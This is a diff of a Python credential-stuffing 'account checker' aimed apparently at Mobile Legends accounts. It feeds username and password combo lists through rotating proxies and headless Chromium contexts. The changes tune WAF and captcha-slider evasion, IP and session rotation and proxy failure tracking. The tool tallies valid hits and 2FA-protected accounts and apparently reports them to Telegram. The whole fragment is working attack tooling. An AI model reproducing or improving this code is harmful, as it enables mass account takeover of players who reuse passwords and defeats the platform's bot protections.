                     return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
                 if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
                     return 'ERR', {'message': 'PROXY_HTTP_ERR'}
-                if api_result["json"]:
-                    break
+                if api_result["json"] or api_result["had_waf"]:
+                    break  # ponytail: 405 right after solved slider = flagged IP; rotate immediately instead of 2nd slow drag
 
         res_json = api_result["json"]
         if not res_json:
@@ -1850,6 +2070,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
 _STATIC_CACHE = {}  # url -> (status, headers, body_bytes)
 _CACHE_LOCKS: dict[str, asyncio.Lock] = {}
 _PROXY_FAILS: dict[tuple[str, str], int] = {}
+_RUN_SALT = f"{os.getpid() % 0xfff:x}{int(time.time()) % 0xffff:x}"
 
 _BLOCKED_DOMAINS = (
     'api.moba5v5.com/r',
@@ -2044,22 +2265,26 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
         if browser_state is not None:
             if not browser_state['gate'].is_set():
+                t_lk = time.monotonic()
                 try:
                     await asyncio.wait_for(browser_state['gate'].wait(), timeout=35.0)
                 except asyncio.TimeoutError:
                     pass
+                _PERF.record_stall('lock', time.monotonic() - t_lk)
             elif (
                 ensure_browser
                 and not browser_state['recycling']
-                and (stats['proxy_ctx'] - browser_state['born_ctx']) >= 180
+                and (stats['proxy_ctx'] - browser_state['born_ctx']) >= 100
                 and (not wave_limit or stats['checked'] < wave_limit - 15)
             ):
                 browser_state['recycling'] = True
                 browser_state['gate'].clear()
+                t_lk = time.monotonic()
                 try:
                     await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=8.0)
                 except Exception:
                     pass
+                _PERF.record_stall('lock', time.monotonic() - t_lk)
                 try:
                     if browser_state['active'] == 0:
                         dbg("Periodic Chromium recycle (clean memory/speed reset)...")
@@ -2072,6 +2297,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     browser_state['born_ctx'] = stats['proxy_ctx']
                     browser_state['recycling'] = False
                     browser_state['gate'].set()
+                    _PERF.resume()
 
         for attempt in range(1, max_attempts + 1):
             if wave_limit and stats['checked'] >= wave_limit:
@@ -2118,7 +2344,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     rot_user_info = await rotated_user_async(
                         cur_proxy_info['username'],
                         cur_proxy_info.get('server', ''),
-                        session_id=f"w{wid}e{worker_epoch}a{attempt}"
+                        session_id=f"{_RUN_SALT}w{wid}v{wave_idx}e{worker_epoch}a{attempt}"
                     )
                     proxy_conf = {
                         'server':   cur_proxy_info['server'],
@@ -2130,10 +2356,17 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 elif cur_proxy_info:
                     ctx_opts['proxy'] = cur_proxy_info
 
+                t_ctx0 = time.monotonic()
                 ctx = await asyncio.wait_for(b.new_context(**ctx_opts), timeout=12.0)
                 stats['proxy_ctx'] += 1
                 page = await ctx.new_page()
                 await _attach_page(page)
+                _ctx_dt = time.monotonic() - t_ctx0
+                if _ctx_dt >= 4.0:
+                    _PERF.record_stall('proxy', _ctx_dt)
+                    if cur_proxy_info and _ctx_dt >= 8.0:
+                        pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
+                        _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
                 return True
             except Exception as e:
                 err_s = str(e)
@@ -2216,10 +2449,13 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 from concurrent.futures import ThreadPoolExecutor
                 _lookup_exec = ThreadPoolExecutor(max_workers=4, thread_name_prefix="mlbb_info")
             loop = asyncio.get_running_loop()
-            return await asyncio.wait_for(
+            _tlk = time.monotonic()
+            _res_info = await asyncio.wait_for(
                 loop.run_in_executor(_lookup_exec, get_player_info, guid_int, sess, dm, 5),
                 timeout=15.0,
             )
+            _PERF.record_stall('lookup', time.monotonic() - _tlk)
+            return _res_info
         except Exception as ie:
             dbg(f"w{wid} lookup err ({guid_int}): {ie}")
             return None
@@ -2300,15 +2536,17 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     inflight_tabs = 0
     recovering = False
     tab0_done = False
-    ACCOUNTS_PER_CTX = 80  # ponytail: keeps fast sticky contexts; prevents Aliyun throttle over long runs
+    ACCOUNTS_PER_CTX = 40  # ponytail: rotate IP+cookies before Aliyun WAF escalation slows checks; RAM JS cache keeps reload cheap
 
     async def _recover_ctx(local_gen: int, reason: str):
         nonlocal ctx_gen, ctx_accts, slider_cleared, recovering, page2
+        t_rec = time.monotonic()
         async with ctx_cond:
             while recovering:
                 await ctx_cond.wait()
             # Another tab already rotated/refreshed this context; skip duplicate work
             if local_gen != ctx_gen:
+                _PERF.record_stall('lock', time.monotonic() - t_rec)
                 return page is not None
             ctx_gen += 1
             recovering = True
@@ -2318,6 +2556,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     await asyncio.wait_for(ctx_cond.wait_for(lambda: inflight_tabs == 0), timeout=45.0)
                 except Exception:
                     still_busy = inflight_tabs > 0
+        _PERF.record_stall('lock', time.monotonic() - t_rec)
         try:
             if reason != 'waf_refresh' or still_busy:
                 ctx_accts = 0
@@ -2449,6 +2688,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         continue
 
                     p2_miss = 0
+                    t_try = time.monotonic()
                     try:
                         kind, res_data = await do_login_via_browser(p_tab, ctx, u, pw, wid, waf_lock=waf_lock)
                     except Exception as ex:
@@ -2469,6 +2709,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         if my_gen == ctx_gen:
                             ctx_accts += 1
                         stats['checked'] += 1
+                        _PERF.mark_check()
                         tg_msg = await handle_result(kind, res_data, u, pw, dec_d, info_res=info_res)
                         combo_q.task_done()
                         done_item = True
@@ -2518,9 +2759,13 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     k_id = _norm_combo_key(u, pw)
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
+                    # ponytail: don't double-count full t_try when WAF/proxy wait already recorded its seconds
+                    if kind != 'WAF' and err_msg not in ('timeout_waiting_response', 'PROXY_HTTP_ERR', '407_TRAFFIC_EXHAUSTED'):
+                        _PERF.record_stall('retry', max(0.5, time.monotonic() - t_try))
                     if _acct_retries[k_id] > 4:
                         _acct_retries.pop(k_id, None)
                         stats['checked'] += 1
+                        _PERF.mark_check()
                         await handle_result('ERR', {'message': err_msg or f'{kind}_exhausted'}, u, pw, {})
                         combo_q.task_done()
                         done_item = True
@@ -2529,10 +2774,13 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     if kind == 'WAF':
                         stats['waf'] += 1
-                        waf_mode = 'rotate' if _acct_retries[k_id] >= 2 else 'waf_refresh'
+                        waf_mode = 'rotate' if (ctx_accts >= 12 or _acct_retries[k_id] >= 2) else 'waf_refresh'
                         if not await _recover_ctx(my_gen, waf_mode):
                             raise RuntimeError(f"w{wid}_waf_recovery_failed")
                     elif kind == 'RATE' or res_data.get('proxy_407') or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
+                        if cur_proxy_info and not res_data.get('proxy_407'):
+                            pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
+                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
                         if not await _recover_ctx(my_gen, 'rotate'):
                             raise RuntimeError(f"w{wid}_rate_recovery_failed")
                     else:
@@ -2860,6 +3108,7 @@ async def async_main():
         _PROXY_FAILS.clear()
         stats['total'] = len(queue)
         stats['start'] = time.time()
+        _PERF.reset()
         stats['workers_total'] = stats['workers'] = min(NUM_CONTEXTS, len(queue))
         stats['proxy_label'] = f"{os.path.basename(PROXY_FILE)} ({len(live_pool or [])} live)" if PROXY_ENABLED else "None (Direct)"
         _TUI_ACTIVE = bool(_IS_TTY and (_TERM != 'dumb') and _COLOR_OK)
@@ -2925,6 +3174,8 @@ async def async_main():
                 stats['workers'] = num_workers
                 stats['workers_total'] = num_workers
                 stats['status'] = 'RUNNING'
+                if wave_idx > 0:
+                    _PERF.resume()
                 render_dashboard(force=True)
 
                 tasks = []
@@ -3004,7 +3255,8 @@ async def async_main():
 
     el = max(time.time() - stats['start'], 1)
     ck = stats['checked']
-    _print_box("CHECK COMPLETE", [
+    _bn = _PERF.summary()
+    _done_rows = [
         f" {c(WHITE)}{BD}TOTAL CHECKED{W} : {ck:,} accounts",
         f" {c(GREEN)}{BD}{S_OK} VALID HITS {W} : {stats['valid']:,}",
         f" {c(GOLD)}{BD}{S_STAR} 2FA / OTP  {W} : {stats['otp']:,}",
@@ -3013,7 +3265,10 @@ async def async_main():
         f" {c(CYAN)}SPEED / TIME {W} : {ck/el:.2f} acc/s  ({int(el)}s)",
         f" {c(GOLD)}PROXY QUOTA  {W} : {_fmt_bytes(stats['bytes_used'])} ({_fmt_bytes(int(stats['bytes_used']/max(ck,1)))}/acc)",
         f" {c(GRAY)}OUTPUT DIR   {W} : {shortpath(OUTPUT_DIR)}/",
-    ], bc=(GOLD if aborted_on_errors else GREEN))
+    ]
+    if _bn:
+        _done_rows.append(f" {c(GOLD)}BOTTLENECK   {W} : {_bn}")
+    _print_box("CHECK COMPLETE", _done_rows, bc=(GOLD if aborted_on_errors else GREEN))
     if aborted_on_errors:
         p_out(f"{c(GOLD)}[!] Dihentikan lebih awal: worker berhenti atau gagal refresh (sisa {combo_q.qsize():,} akun belum diperiksa).{W}")
 
